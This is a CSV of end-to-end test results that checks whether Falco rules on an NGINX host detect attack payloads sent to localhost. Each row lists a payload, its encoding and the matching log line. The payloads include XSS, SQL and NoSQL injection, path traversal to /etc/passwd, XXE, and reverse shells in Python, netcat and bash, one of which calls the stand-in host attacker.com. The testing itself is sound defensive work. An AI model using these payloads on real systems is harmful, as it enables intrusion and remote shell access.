"DESCRIPTION","DURATION IN MS","NAME","PARENT SUITE","START TIME","STATUS","STOP TIME","SUB SUITE","SUITE","TEST CLASS","TEST METHOD"
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `XSS_MUT_002` |
| **Name** | SVG mutation XSS |
| **Category** | XSS |
| **Subcategory** | mutation_xss |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `<svg><g/onload=alert('XSS')></g></svg>`
- **Encoded**: `%3Csvg%3E%3Cg%2Fonload%3Dalert%28%27XSS%27%29%3E%3C%2Fg%3E%3C%2Fsvg%3E`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~57000ms
- **Timestamp**: 02:45:11.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX XSS] Polyglot XSS Attack` |
| **Matched Rule** | `[NGINX XSS] Polyglot XSS Attack test_id=XSS_MUT_002-1769913911464-dj4usr pattern_id=XSS_MUT_002 uri=/?q=%3Csvg%3E%3Cg%2Fonload%3Dalert%28%27XSS%27%29%3E%3C%2Fg%3E%3C%2Fsvg%3E client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX XSS] Polyglot XSS Attack test_id=XSS_MUT_002-1769913911464-dj4usr pattern_id=XSS_MUT_002 uri=/?q=%3Csvg%3E%3Cg%2Fonload%3Dalert%28%27XSS%27%29%3E%3C%2Fg%3E%3C%2Fsvg%3E client=127.0.0.1 method=GET

**Falco Log Entry**:
```
02:45:11.000000000: Critical [NGINX XSS] Polyglot XSS Attack test_id=XSS_MUT_002-1769913911464-dj4usr pattern_id=XSS_MUT_002 uri=/?q=%3Csvg%3E%3Cg%2Fonload%3Dalert%28%27XSS%27%29%3E%3C%2Fg%3E%3C%2Fsvg%3E client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[167_XSS_MUT_002]","allure","2026-02-01","passed","2026-02-01","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `PATH_ADV_054` |
| **Name** | Unicode Encoded Traversal |
| **Category** | PATH |
| **Subcategory** | filter_bypass |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd`
- **Encoded**: `%c0%ae%c0%ae%2F%c0%ae%c0%ae%2Fetc%2Fpasswd`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~39000ms
- **Timestamp**: 02:45:29.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX Traversal] Encoded path traversal attack detected` |
| **Matched Rule** | `[NGINX Traversal] Encoded path traversal attack detected test_id=PATH_ADV_054-1769913929992-491vf pattern_id=PATH_ADV_054 uri=/?q=%c0%ae%c0%ae%2F%c0%ae%c0%ae%2Fetc%2Fpasswd client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX Traversal] Encoded path traversal attack detected test_id=PATH_ADV_054-1769913929992-491vf pattern_id=PATH_ADV_054 uri=/?q=%c0%ae%c0%ae%2F%c0%ae%c0%ae%2Fetc%2Fpasswd client=127.0.0.1

**Falco Log Entry**:
```
02:45:29.000000000: Critical [NGINX Traversal] Encoded path traversal attack detected test_id=PATH_ADV_054-1769913929992-491vf pattern_id=PATH_ADV_054 uri=/?q=%c0%ae%c0%ae%2F%c0%ae%c0%ae%2Fetc%2Fpasswd client=127.0.0.1
```","2","test_e2e_with_logs[219_PATH_ADV_054]","allure","2026-02-01","passed","2026-02-01","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SQLI_BOOL_016` |
| **Name** | URL encoded classic boolean |
| **Category** | SQLI |
| **Subcategory** | boolean_blind |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `%27%20OR%20%271%27%3D%271`
- **Encoded**: `%2527%2520OR%2520%25271%2527%253D%25271`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~23000ms
- **Timestamp**: 02:45:45.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX SQLi] Encoded SQL Injection Pattern` |
| **Matched Rule** | `[NGINX SQLi] Encoded SQL Injection Pattern test_id=SQLI_BOOL_016-1769913945559-2v1tdu pattern_id=SQLI_BOOL_016 uri=/?q=%2527%2520OR%2520%25271%2527%253D%25271 client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX SQLi] Encoded SQL Injection Pattern test_id=SQLI_BOOL_016-1769913945559-2v1tdu pattern_id=SQLI_BOOL_016 uri=/?q=%2527%2520OR%2520%25271%2527%253D%25271 client=127.0.0.1 method=GET

**Falco Log Entry**:
```
02:45:45.000000000: Warning [NGINX SQLi] Encoded SQL Injection Pattern test_id=SQLI_BOOL_016-1769913945559-2v1tdu pattern_id=SQLI_BOOL_016 uri=/?q=%2527%2520OR%2520%25271%2527%253D%25271 client=127.0.0.1 method=GET
```","1","test_e2e_with_logs[047_SQLI_BOOL_016]","allure","2026-02-01","passed","2026-02-01","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `GQL_SQLI_001` |
| **Name** | GraphQL SQL injection in argument |
| **Category** | GRAPHQL |
| **Subcategory** | sqli_injection |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `query{user(id:""1' UNION SELECT * FROM admin_users--""){name}}`
- **Encoded**: `query%7Buser(id%3A%221'%20UNION%20SELECT%20*%20FROM%20admin_users--%22)%7Bname%7D%7D`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~38000ms
- **Timestamp**: 02:45:30.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX SQLi] Boolean-based Blind SQL Injection` |
| **Matched Rule** | `[NGINX SQLi] Boolean-based Blind SQL Injection test_id=GQL_SQLI_001-1769913930436-zj62m pattern_id=GQL_SQLI_001 uri=/?q=query%7Buser(id%3A%221'%20UNION%20SELECT%20*%20FROM%20admin_users--%22)%7Bname%7D%7D client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX SQLi] Boolean-based Blind SQL Injection test_id=GQL_SQLI_001-1769913930436-zj62m pattern_id=GQL_SQLI_001 uri=/?q=query%7Buser(id%3A%221'%20UNION%20SELECT%20*%20FROM%20admin_users--%22)%7Bname%7D%7D client=127.0.0.1 method=GET

**Falco Log Entry**:
```
02:45:30.000000000: Critical [NGINX SQLi] Boolean-based Blind SQL Injection test_id=GQL_SQLI_001-1769913930436-zj62m pattern_id=GQL_SQLI_001 uri=/?q=query%7Buser(id%3A%221'%20UNION%20SELECT%20*%20FROM%20admin_users--%22)%7Bname%7D%7D client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[439_GQL_SQLI_001]","allure","2026-02-01","passed","2026-02-01","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SQLI_BLIND_005` |
| **Name** | Conditional error-based blind injection |
| **Category** | SQLI |
| **Subcategory** | blind |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `' AND (SELECT CASE WHEN (1=1) THEN 1 ELSE (SELECT 1 UNION SELECT 2) END)=1 --`
- **Encoded**: `%27%20AND%20%28SELECT%20CASE%20WHEN%20%281%3D1%29%20THEN%201%20ELSE%20%28SELECT%201%20UNION%20SELECT%202%29%20END%29%3D1%20--`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~54000ms
- **Timestamp**: 02:45:14.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX SQLi] Boolean-based Blind SQL Injection` |
| **Matched Rule** | `[NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_BLIND_005-1769913914980-msd2i6 pattern_id=SQLI_BLIND_005 uri=/?q=%27%20AND%20%28SELECT%20CASE%20WHEN%20%281%3D1%29%20THEN%201%20ELSE%20%28SELECT%201%20UNION%20SELECT%202%29%20END%29%3D1%20-- client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_BLIND_005-1769913914980-msd2i6 pattern_id=SQLI_BLIND_005 uri=/?q=%27%20AND%20%28SELECT%20CASE%20WHEN%20%281%3D1%29%20THEN%201%20ELSE%20%28SELECT%201%20UNION%20SELECT%202%29%20END%29%3D1%20-- client=127.0.0.1 method=GET

**Falco Log Entry**:
```
02:45:14.000000000: Critical [NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_BLIND_005-1769913914980-msd2i6 pattern_id=SQLI_BLIND_005 uri=/?q=%27%20AND%20%28SELECT%20CASE%20WHEN%20%281%3D1%29%20THEN%201%20ELSE%20%28SELECT%201%20UNION%20SELECT%202%29%20END%29%3D1%20-- client=127.0.0.1 method=GET
```","1","test_e2e_with_logs[026_SQLI_BLIND_005]","allure","2026-02-01","passed","2026-02-01","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `PATH_ADV_003` |
| **Name** | Mixed slash/backslash traversal |
| **Category** | PATH |
| **Subcategory** | advanced_techniques |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `..\../`
- **Encoded**: `..%5C..%2F`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~47000ms
- **Timestamp**: 02:45:21.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX Traversal] Windows path traversal attack detected` |
| **Matched Rule** | `[NGINX Traversal] Windows path traversal attack detected test_id=PATH_ADV_003-1769913921474-5kb24q pattern_id=PATH_ADV_003 uri=/?q=..%5C..%2F client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX Traversal] Windows path traversal attack detected test_id=PATH_ADV_003-1769913921474-5kb24q pattern_id=PATH_ADV_003 uri=/?q=..%5C..%2F client=127.0.0.1

**Falco Log Entry**:
```
02:45:21.000000000: Critical [NGINX Traversal] Windows path traversal attack detected test_id=PATH_ADV_003-1769913921474-5kb24q pattern_id=PATH_ADV_003 uri=/?q=..%5C..%2F client=127.0.0.1
```","2","test_e2e_with_logs[212_PATH_ADV_003]","allure","2026-02-01","passed","2026-02-01","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SQLI_TIME_ADV_001` |
| **Name** | MySQL SLEEP with Random Delay |
| **Category** | SQLI |
| **Subcategory** | time_based_advanced |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `' AND SLEEP(RAND()*5)--`
- **Encoded**: `'%20AND%20SLEEP(RAND()*5)--`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~18000ms
- **Timestamp**: 02:45:50.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX SQLi] Time-based Blind SQL Injection` |
| **Matched Rule** | `[NGINX SQLi] Time-based Blind SQL Injection test_id=SQLI_TIME_ADV_001-1769913950071-b9s8yn pattern_id=SQLI_TIME_ADV_001 uri=/?q='%20AND%20SLEEP(RAND()*5)-- client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX SQLi] Time-based Blind SQL Injection test_id=SQLI_TIME_ADV_001-1769913950071-b9s8yn pattern_id=SQLI_TIME_ADV_001 uri=/?q='%20AND%20SLEEP(RAND()*5)-- client=127.0.0.1 method=GET

**Falco Log Entry**:
```
02:45:50.000000000: Critical [NGINX SQLi] Time-based Blind SQL Injection test_id=SQLI_TIME_ADV_001-1769913950071-b9s8yn pattern_id=SQLI_TIME_ADV_001 uri=/?q='%20AND%20SLEEP(RAND()*5)-- client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[114_SQLI_TIME_ADV_001]","allure","2026-02-01","passed","2026-02-01","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `XSS_DOM_015` |
| **Name** | DOM insertAdjacentHTML injection |
| **Category** | XSS |
| **Subcategory** | dom |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `insertAdjacentHTML('beforeend','<script>alert(1)</script>')`
- **Encoded**: `insertAdjacentHTML('beforeend'%2C'%3Cscript%3Ealert(1)%3C%2Fscript%3E')`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~46000ms
- **Timestamp**: 02:45:22.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX XSS] DOM-based XSS Attack` |
| **Matched Rule** | `[NGINX XSS] DOM-based XSS Attack test_id=XSS_DOM_015-1769913922991-ok7dcf pattern_id=XSS_DOM_015 uri=/?q=insertAdjacentHTML('beforeend'%2C'%3Cscript%3Ealert(1)%3C%2Fscript%3E') client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX XSS] DOM-based XSS Attack test_id=XSS_DOM_015-1769913922991-ok7dcf pattern_id=XSS_DOM_015 uri=/?q=insertAdjacentHTML('beforeend'%2C'%3Cscript%3Ealert(1)%3C%2Fscript%3E') client=127.0.0.1 method=GET

**Falco Log Entry**:
```
02:45:22.000000000: Critical [NGINX XSS] DOM-based XSS Attack test_id=XSS_DOM_015-1769913922991-ok7dcf pattern_id=XSS_DOM_015 uri=/?q=insertAdjacentHTML('beforeend'%2C'%3Cscript%3Ealert(1)%3C%2Fscript%3E') client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[159_XSS_DOM_015]","allure","2026-02-01","passed","2026-02-01","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `EMRG_MONGO_005` |
| **Name** | MongoDB JavaScript code injection |
| **Category** | OTHER |
| **Subcategory** | mongodb_injection |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `'; return db.users.find(); //`
- **Encoded**: `%27%3B%20return%20db.users.find%28%29%3B%20//`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~53000ms
- **Timestamp**: 02:45:15.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX Emerging Threat] MongoDB NoSQL injection` |
| **Matched Rule** | `[NGINX Emerging Threat] MongoDB NoSQL injection test_id=EMRG_MONGO_005-1769913915436-298yxl pattern_id=EMRG_MONGO_005 uri=/?q=%27%3B%20return%20db.users.find%28%29%3B%20// client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX Emerging Threat] MongoDB NoSQL injection test_id=EMRG_MONGO_005-1769913915436-298yxl pattern_id=EMRG_MONGO_005 uri=/?q=%27%3B%20return%20db.users.find%28%29%3B%20// client=127.0.0.1

**Falco Log Entry**:
```
02:45:15.000000000: Critical [NGINX Emerging Threat] MongoDB NoSQL injection test_id=EMRG_MONGO_005-1769913915436-298yxl pattern_id=EMRG_MONGO_005 uri=/?q=%27%3B%20return%20db.users.find%28%29%3B%20// client=127.0.0.1
```","2","test_e2e_with_logs[424_EMRG_MONGO_005]","allure","2026-02-01","passed","2026-02-01","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `XXE_NETDOC_001` |
| **Name** | XXE netdoc protocol file access |
| **Category** | XXE |
| **Subcategory** | protocol_abuse |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `<!ENTITY xxe SYSTEM ""netdoc:///etc/passwd"">`
- **Encoded**: `%3C%21ENTITY%20xxe%20SYSTEM%20%22netdoc%3A%2F%2F%2Fetc%2Fpasswd%22%3E`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~42000ms
- **Timestamp**: 02:45:26.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX Traversal] File inclusion attack detected` |
| **Matched Rule** | `[NGINX Traversal] File inclusion attack detected test_id=XXE_NETDOC_001-1769913926940-1mxd1l pattern_id=XXE_NETDOC_001 uri=/?q=%3C%21ENTITY%20xxe%20SYSTEM%20%22netdoc%3A%2F%2F%2Fetc%2Fpasswd%22%3E client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX Traversal] File inclusion attack detected test_id=XXE_NETDOC_001-1769913926940-1mxd1l pattern_id=XXE_NETDOC_001 uri=/?q=%3C%21ENTITY%20xxe%20SYSTEM%20%22netdoc%3A%2F%2F%2Fetc%2Fpasswd%22%3E client=127.0.0.1

**Falco Log Entry**:
```
02:45:26.000000000: Critical [NGINX Traversal] File inclusion attack detected test_id=XXE_NETDOC_001-1769913926940-1mxd1l pattern_id=XXE_NETDOC_001 uri=/?q=%3C%21ENTITY%20xxe%20SYSTEM%20%22netdoc%3A%2F%2F%2Fetc%2Fpasswd%22%3E client=127.0.0.1
```","2","test_e2e_with_logs[428_XXE_NETDOC_001]","allure","2026-02-01","passed","2026-02-01","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `CMD_REVSH_003` |
| **Name** | Python reverse shell |
| **Category** | CMDINJ |
| **Subcategory** | reverse_shell |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `python -c 'import socket,subprocess,os;s=socket.socket();s.connect((""10.0.0.1"",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([""/bin/sh"",""-i""])'`
- **Encoded**: `python%20-c%20'import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket()%3Bs.connect((%2210.0.0.1%22%2C4444))%3Bos.dup2(s.fileno()%2C0)%3Bos.dup2(s.fileno()%2C1)%3Bos.dup2(s.fileno()%2C2)%3Bsubprocess.call(%5B%22%2Fbin%2Fsh%22%2C%22-i%22%5D)'`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~39000ms
- **Timestamp**: 02:45:29.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX CMDi] Advanced command injection attempt` |
| **Matched Rule** | `[NGINX CMDi] Advanced command injection attempt test_id=CMD_REVSH_003-1769913929489-zhmfgd pattern_id=CMD_REVSH_003 uri=/?q=python%20-c%20'import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket()%3Bs.connect((%2210.0.0.1%22%2C4444))%3Bos.dup2(s.fileno()%2C0)%3Bos.dup2(s.fileno()%2C1)%3Bos.dup2(s.fileno()%2C2)%3Bsubprocess.call(%5B%22%2Fbin%2Fsh%22%2C%22-i%22%5D)' client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX CMDi] Advanced command injection attempt test_id=CMD_REVSH_003-1769913929489-zhmfgd pattern_id=CMD_REVSH_003 uri=/?q=python%20-c%20'import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket()%3Bs.connect((%2210.0.0.1%22%2C4444))%3Bos.dup2(s.fileno()%2C0)%3Bos.dup2(s.fileno()%2C1)%3Bos.dup2(s.fileno()%2C2)%3Bsubprocess.call(%5B%22%2Fbin%2Fsh%22%2C%22-i%22%5D)' client=127.0.0.1

**Falco Log Entry**:
```
02:45:29.000000000: Warning [NGINX CMDi] Advanced command injection attempt test_id=CMD_REVSH_003-1769913929489-zhmfgd pattern_id=CMD_REVSH_003 uri=/?q=python%20-c%20'import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket()%3Bs.connect((%2210.0.0.1%22%2C4444))%3Bos.dup2(s.fileno()%2C0)%3Bos.dup2(s.fileno()%2C1)%3Bos.dup2(s.fileno()%2C2)%3Bsubprocess.call(%5B%22%2Fbin%2Fsh%22%2C%22-i%22%5D)' client=127.0.0.1
```","2","test_e2e_with_logs[349_CMD_REVSH_003]","allure","2026-02-01","passed","2026-02-01","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `CMD_BASH_002` |
| **Name** | Bash reverse shell |
| **Category** | CMDI |
| **Subcategory** | bash_specific |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `&& bash -i >& /dev/tcp/attacker.com/4444 0>&1`
- **Encoded**: `%26%26%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2Fattacker.com%2F4444%200%3E%261`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~24000ms
- **Timestamp**: 02:45:44.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX CMDi] Advanced command injection attempt` |
| **Matched Rule** | `[NGINX CMDi] Advanced command injection attempt test_id=CMD_BASH_002-1769913944028-wm7ec pattern_id=CMD_BASH_002 uri=/?q=%26%26%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2Fattacker.com%2F4444%200%3E%261 client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX CMDi] Advanced command injection attempt test_id=CMD_BASH_002-1769913944028-wm7ec pattern_id=CMD_BASH_002 uri=/?q=%26%26%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2Fattacker.com%2F4444%200%3E%261 client=127.0.0.1

**Falco Log Entry**:
```
02:45:44.000000000: Warning [NGINX CMDi] Advanced command injection attempt test_id=CMD_BASH_002-1769913944028-wm7ec pattern_id=CMD_BASH_002 uri=/?q=%26%26%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2Fattacker.com%2F4444%200%3E%261 client=127.0.0.1
```","2","test_e2e_with_logs[285_CMD_BASH_002]","allure","2026-02-01","passed","2026-02-01","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `PATH_URL_002` |
| **Name** | URL encoded double traversal |
| **Category** | PATH |
| **Subcategory** | url_encoded |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `..%2F..%2F`
- **Encoded**: `..%252F..%252F`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~34000ms
- **Timestamp**: 02:45:34.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX SQLi] Encoded SQL Injection Pattern` |
| **Matched Rule** | `[NGINX SQLi] Encoded SQL Injection Pattern test_id=PATH_URL_002-1769913934502-dlmc9h pattern_id=PATH_URL_002 uri=/?q=..%252F..%252F client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX SQLi] Encoded SQL Injection Pattern test_id=PATH_URL_002-1769913934502-dlmc9h pattern_id=PATH_URL_002 uri=/?q=..%252F..%252F client=127.0.0.1 method=GET

**Falco Log Entry**:
```
02:45:34.000000000: Warning [NGINX SQLi] Encoded SQL Injection Pattern test_id=PATH_URL_002-1769913934502-dlmc9h pattern_id=PATH_URL_002 uri=/?q=..%252F..%252F client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[261_PATH_URL_002]","allure","2026-02-01","passed","2026-02-01","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `CMD_REVSH_002` |
| **Name** | Netcat reverse shell |
| **Category** | CMDINJ |
| **Subcategory** | reverse_shell |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `nc -e /bin/sh 10.0.0.1 4444`
- **Encoded**: `nc%20-e%20%2Fbin%2Fsh%2010.0.0.1%204444`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~40000ms
- **Timestamp**: 02:45:28.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX CMDi] Advanced command injection attempt` |
| **Matched Rule** | `[NGINX CMDi] Advanced command injection attempt test_id=CMD_REVSH_002-1769913928987-rxdszq pattern_id=CMD_REVSH_002 uri=/?q=nc%20-e%20%2Fbin%2Fsh%2010.0.0.1%204444 client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX CMDi] Advanced command injection attempt test_id=CMD_REVSH_002-1769913928987-rxdszq pattern_id=CMD_REVSH_002 uri=/?q=nc%20-e%20%2Fbin%2Fsh%2010.0.0.1%204444 client=127.0.0.1

**Falco Log Entry**:
```
02:45:28.000000000: Warning [NGINX CMDi] Advanced command injection attempt test_id=CMD_REVSH_002-1769913928987-rxdszq pattern_id=CMD_REVSH_002 uri=/?q=nc%20-e%20%2Fbin%2Fsh%2010.0.0.1%204444 client=127.0.0.1
```","1","test_e2e_with_logs[348_CMD_REVSH_002]","allure","2026-02-01","passed","2026-02-01","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `NOSQL_MONGO_008` |
| **Name** | MongoDB Regex Injection |
| **Category** | NOSQL_EXTENDED |
| **Subcategory** | mongodb |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `{""$regex"":""^admin""}`
- **Encoded**: `%7B%22%24regex%22%3A%22%5Eadmin%22%7D`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~22000ms
- **Timestamp**: 02:45:46.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX Emerging Threat] MongoDB NoSQL injection` |
| **Matched Rule** | `[NGINX Emerging Threat] MongoDB NoSQL injection test_id=NOSQL_MONGO_008-1769913946944-fk9qa pattern_id=NOSQL_MONGO_008 uri=/?q=%7B%22%24regex%22%3A%22%5Eadmin%22%7D client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX Emerging Threat] MongoDB NoSQL injection test_id=NOSQL_MONGO_008-1769913946944-fk9qa pattern_id=NOSQL_MONGO_008 uri=/?q=%7B%22%24regex%22%3A%22%5Eadmin%22%7D client=127.0.0.1

**Falco Log Entry**:
```
02:45:46.000000000: Critical [NGINX Emerging Threat] MongoDB NoSQL injection test_id=NOSQL_MONGO_008-1769913946944-fk9qa pattern_id=NOSQL_MONGO_008 uri=/?q=%7B%22%24regex%22%3A%22%5Eadmin%22%7D client=127.0.0.1
```","2","test_e2e_with_logs[425_NOSQL_MONGO_008]","allure","2026-02-01","passed","2026-02-01","","test_e2e_wrapper","",""
